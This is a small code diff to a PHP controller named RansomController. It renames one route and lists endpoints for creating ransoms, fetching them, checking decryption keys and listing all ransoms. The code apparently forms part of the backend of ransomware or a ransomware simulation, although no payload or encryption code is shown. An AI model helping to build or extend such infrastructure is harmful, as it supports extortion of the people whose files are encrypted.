@@ -23,7 +23,7 @@ class RansomController extends Controller
         $this->service = $cipher_service;
 
         $this->add_endpoint("GET", "", [$this, "create_ransom"]);
-        $this->add_endpoint("GET", "ransom/{string:id}", [$this, "fetch_ransom"]);
+        $this->add_endpoint("GET", "id/{string:id}", [$this, "fetch_ransom"]);
         $this->add_endpoint("GET", "{string:id}/{string:key}", [$this, "check_decryption_key"]);
         $this->add_endpoint("GET", "list", [$this, "get_all_ransoms"]);
         $this->add_endpoint("POST", "", [$this, "create_premake_ransom"]);
